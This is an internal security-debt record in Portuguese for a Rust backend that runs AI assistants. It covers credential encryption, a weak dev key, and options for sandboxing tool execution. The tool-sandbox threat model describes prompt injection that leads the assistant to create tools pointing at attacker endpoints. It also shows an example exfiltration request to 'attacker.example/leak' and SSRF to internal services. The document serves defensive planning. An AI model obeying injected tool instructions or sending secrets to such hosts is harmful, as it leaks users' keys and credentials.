# Security Debt

Decisões e débitos de segurança conhecidos — o que foi resolvido, o que está pendente, e as restrições de cada pendência.

> Plano: [harness-plan-final.md](../../harness-plan-final.md) §S0 / S0b / T3.1 / T3.2
> Status: S0 **resolvido**; S0b, T3.1, T3.2 **pendentes**.

## G3 — Plaintext em tabelas acessórias (resolvido em S0)

Os seguintes campos em `assistant_integrations` estavam armazenados em **plaintext** até S0:

- `config_token` (token de integração)
- `config_phone_number`
- `config_chatwoot_url`
- `config_webhook_verify_token`

Além de, em `users`:

- `api_key_elevenlabs`, `api_key_mercadopago`, `api_key_stripe`, `api_key_grok`, `api_key_deepseek`

Estado atual pós-S0:
- **Write path**: passam por `services/encryption.rs::encrypt_opt()` antes de `INSERT`/`UPDATE`.
- **Read path**: passam por `try_decrypt_or_passthrough()` — se o valor já é plaintext (rows antigas), retorna como está; se começa com prefix de ciphertext, decripta.
- **Backfill**: script `cargo run --bin encrypt_legacy --apply` (código em `backend/src/bin/encrypt_legacy.rs`). Idempotente — re-rodar é seguro.

**Restrição operacional**: **NÃO rodar backfill em produção** sem antes implementar **fingerprint HMAC** para lookups por equality (ex: `SELECT ... WHERE config_phone_number = ?` não funciona em campo encriptado). Ver TODO `S0` em `services/messaging.rs` marcando os lookups afetados. Até fingerprint existir, backfill produção fica restrito a rows sem acesso por equality.

## G4 — `ENCRYPTION_KEY` fraca em dev (pendente S0b)

`ENCRYPTION_KEY` usada em dev/staging é sequencial (`0123...` repetido até 64 chars). Funcional para crypto correto, mas trivialmente recuperável se qualquer dump vazar.

Ação pendente:
- Rotacionar para `openssl rand -hex 32` em Coolify depois de **S0 verificado ≥3 dias em produção** sem regressão.
- `docker-compose.coolify.yml` está no `.gitignore` — a chave atual não está comprometida publicamente, só no servidor Coolify + `.env` local.

**Threat model atual**: atacante **sem acesso** ao servidor Coolify. Se essa hipótese for rejeitada pelo time (ex: shared hosting, acesso físico duvidoso), S0b vira **bloqueante da Onda 1**.

**Alternativa**: postergar S0b para T3.2 Fase 0 — o `KeyResolver` de T3.2 Fase 1 torna rotação trivial. Decisão a tomar antes de executar Onda 0.

## T3.1 — Tool execution sandbox (pendente pentest)

### Threat model

Tool execution hoje roda **no mesmo processo Rust** que o backend principal. Consequências:

- `ENCRYPTION_KEY` (global em memória via `Config`) é acessível a qualquer código rodando no processo — incluindo tool handlers (`services/assistant.rs::execute_tool` em `services/llm.rs:2166`).
- JWT secret (`config.jwt_secret`), SMTP credentials (`config.smtp_password`), Baileys API key (`config.baileys_api_key`), Meta app secret e chaves de MP/Stripe dos usuários (decriptadas sob demanda via `workspace::get_decrypted_api_key`) coexistem no mesmo address space.
- Tool HTTP requests usam `reqwest::Client` compartilhado — se um tool conseguir emitir requests arbitrários, pode:
  1. Exfiltrar chaves via `POST https://attacker.example/leak` com headers/body controlados.
  2. Tocar endpoints internos (`localhost:9042` Cassandra, `localhost:3025` Baileys API, `localhost:6379` Redis).
  3. SSRF para metadata endpoints AWS/GCP se Coolify rodar em cloud.

O payload de cada tool é controlado hoje pelo **output do LLM** — ou seja, um adversário que consiga prompt-injection contra a conversa pode induzir `create_tool(name="...", endpoint="http://attacker/...")` ou `update_tool` com endpoint sob controle dele, desde que o assistente aceite. Os guard-rails existentes (`rate_limit_per_day`, validação de `is_enabled`, ownership por `user_id`) mitigam escala mas **não** isolam segredos de runtime.

Conclusão: **é teoricamente exploitable hoje**; a magnitude real depende de pentest externo que simule prompt-injection contra assistentes de produção.

### Opções de sandbox (decisão sob evidência)

Ordem aproximada de custo crescente vs isolation ganho:

- **A — Processo separado + IPC (baixo esforço inicial, alto custo ops)**
  - Tools rodam em binário `tool-executor` isolado, sem acesso a `ENCRYPTION_KEY` ou credenciais do usuário (recebe só o payload e o endpoint já resolvidos).
  - Comunicação: Unix socket ou named pipe. `tokio::net::UnixStream` + `serde_json` sobre length-prefix.
  - Crédito: reaproveita `reqwest::Client` — mesmo perfil de retry/timeout.
  - Débito: 2 binários para deploy, 2 health checks, 2 linhas de log a correlacionar via `request_id`.
  - **Aplicação**: razoável se pentest mostrar que exfiltração de secret é o vetor principal.

- **B — WASM runtime (wasmtime) (esforço alto inicial, custo runtime baixo)**
  - Cada tool handler reescrito como módulo `.wasm` com host functions bem definidas (`host_http_post`, `host_log`). `ENCRYPTION_KEY` nunca passa para WASM guest.
  - Isolation native: WASM já é memory-safe, sandbox cumprido pelo próprio runtime.
  - Débito: refactor pesado de todos os 6 tool types (http_request, notify_human, send_document, schedule_appointment, pix_payment, card_payment). Ergonomia piora (debug de WASM guest).
  - **Aplicação**: recomendado se pentest mostrar que **múltiplos vetores** estão expostos e prioridade é minimizar a attack surface de longo prazo.

- **C — Container per-request (Firecracker/gVisor) (custo operacional máximo)**
  - Cada tool call spawna microVM dedicada. Isolation máxima (kernel separado).
  - Latência típica: +50-150ms por tool call. Para tools rápidos (ex: `notify_human`) isso dobra o tempo de resposta ao usuário.
  - Custo ops: infra Firecracker/Kata/gVisor rodando, orquestração, rate-limit de spawns.
  - **Aplicação**: só se pentest mostrar breach real com exfiltração **e** se volume de tool calls justificar (tool-heavy workloads em regulated industries).

### Gate de decisão

T3.1 **NÃO deve ser implementado** até:

1. Pentest externo ter sido executado contra ambiente de staging que espelha produção.
2. Relatório do pentest identificar concretamente qual (se algum) dos 3 cenários de exfiltração acima é explorável.
3. Decisão arquitetural por A, B ou C registrada neste documento com referência ao relatório.

Enquanto o gate não fechar, **continuar mitigações existentes**:
- Validação server-side de `endpoint` / `method` / `headers_json` em `POST /api/assistants/:id/tools` (checar se `test-url` rate-limiter e sanitização de URL estão cobrindo redirects/file://).
- Revisar `tests/consistency/baisync-coverage.ts` para flagging de actions novas que ampliem superfície de ataque.
- `services/webhook_dedup.rs` mode Block (quando flipped) reduz superfície de replay.

## T3.2 Fase 1 — Key versioning (pendente)

Quando T3.2 Fase 1 executar:
- Adicionar `key_version INT DEFAULT 1` na tabela `workspace_api_keys` (única tabela com ciphertext **nativo** após S0).
- Refactor `services/encryption.rs` → `KeyResolver` que seleciona chave por `key_version`. Lê `ENCRYPTION_KEY_V1`, `ENCRYPTION_KEY_V2` de env.
- **Teste OBRIGATÓRIO**: `test_old_ciphertext_readable_after_adding_v2()` — grava row com v1, depois adiciona v2, lê row original e confirma plaintext correto.

Sem esse teste, qualquer rotação de chave arrisca perder dados.

## Invariante de logging

**Nunca** logar key, token, ciphertext ou secret em `tracing::*` (info/debug/error/warn). Reforçado em `backend/AGENTS.md`. Em caso de debugging, usar hash parcial (primeiros 4 chars) ou flag booleano indicando presença.
